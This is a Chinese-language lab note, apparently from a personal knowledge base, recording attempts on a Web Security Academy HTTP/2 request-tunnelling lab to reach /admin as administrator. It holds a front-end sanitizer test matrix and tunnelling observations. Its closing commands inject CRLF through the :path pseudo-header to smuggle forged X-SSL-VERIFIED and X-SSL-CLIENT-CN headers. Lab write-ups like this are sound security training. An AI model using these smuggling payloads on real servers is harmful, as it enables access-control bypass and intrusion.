---
title: lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling
---

# lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

> evidences: [[h2-smuggling-family]]

- 题面:以 administrator 访问 `/admin` 并删 carlos;前端 h2→h1 降级、"fails to adequately sanitize incoming header names"、不复用后端连接(只剩 request tunnelling)。
- 实例(批51):https://0a7f003c042b812f859426e500e10089.web-security-academy.net
- 判定:**stuck**(隧道搬运与内层响应读取稳定可用,但信任位既不可伪造也不可借用;门仍是会话角色)

## 前端头名消毒矩阵(批47/50,复证)

| 注入位置 | 结果 |
| --- | --- |
| 头**值**含 `\r\n` | `RST_STREAM` |
| 头**名**含 `\r\n` | `400 {"error":"Invalid request"}` |
| 头**名**含裸 `\n` | `400 Newlines in headers are not allowed` |
| 头**名**含空格/制表(批51 复测 `--hdr2 'X-SSL-VERIFIED ||1'`) | **放行**(直达 /admin 仍 401) |
| **`:path` 含 CRLF** | **放行且原样写进 h1** ⇒ 唯一可用注入面 |

## 隧道与内层读取(批50/51)

- 变体表(`tunnel_variant_scan --outer-method HEAD --outer-path /admin --inner-path /admin --baseline 401`):clean 401(CL 2776);内层块**不收尾** -> `500 Received only 174 of expected 2776 bytes`(记账 oracle 拿到 M=2776);内层块**收尾** -> h2 body 里给出内层响应原文(内层状态可读);`flips=[]`。
- 批51 复证外层 `HEAD /admin` + `:path` 内嵌 `GET /admin` 收尾形 -> h2 body 内嵌套 h1 响应完整可读(401/2776 + `Admin interface only available if logged in as an administrator`)。

## 伪造信任位:全部否证

- 内层块塞 `X-SSL-VERIFIED: 1` + `X-SSL-CLIENT-CN: administrator`(收尾形)-> 内层 **401**(2776)。批51 追加泄漏出的 `X-FRONTEND-KEY: 678833581` -> 仍 **401**。
- 头名伪装(名字带尾随空格,前端当新名放行、后端归一化)直达 /admin -> **401** ⇒ 后端不采信客户端自带的证书头(前端追加的 `X-SSL-VERIFIED: 0` / `X-SSL-CLIENT-CN: null` 生效或同名头被合并)。
- 结论**记死**:隧道只原样搬字节,借不来前端的信任位;`:path` CRLF 是唯一注入面,而到达后端的请求自带不了角色。

## 仍在档的正面前端事实

- 前端会给自己转发的请求**追加**头块(`Host`、`X-SSL-VERIFIED: 0`、`X-SSL-CLIENT-CN: null`、`X-FRONTEND-KEY`),可用「未闭合 `POST /`(search= 结尾)」把它落进 body 再经搜索页回显泄漏(≈68 字符截断);存储池用公开评论可拿全文。
- 客户端证书头是该前端的 SSL 状态传递方式(因此题面才点「header names 消毒不足」),但仿造值不被后端接受。

## 复现命令

```
tunnel_variant_scan <inst>/ --outer-method HEAD --outer-path /admin --inner-method GET --inner-path /admin --baseline 401 --read-ms 4000
h2_req <inst>/ --method HEAD --path '/admin HTTP/1.1\r\nHost: <H>\r\n\r\nGET /admin HTTP/1.1\r\nHost: <H>\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: <key>\r\nX: ' --read-ms 5000
h2_req <inst>/ --method GET --path /admin --hdr2 'X-SSL-VERIFIED ||1' --hdr2 'X-SSL-CLIENT-CN ||administrator'
```

## 关系

- 族:[[h2-smuggling-family]];方法见 [[h2-tunnelling-and-h2cl-practice]]、[[h2-frontend-sanitizer-matrix]]。
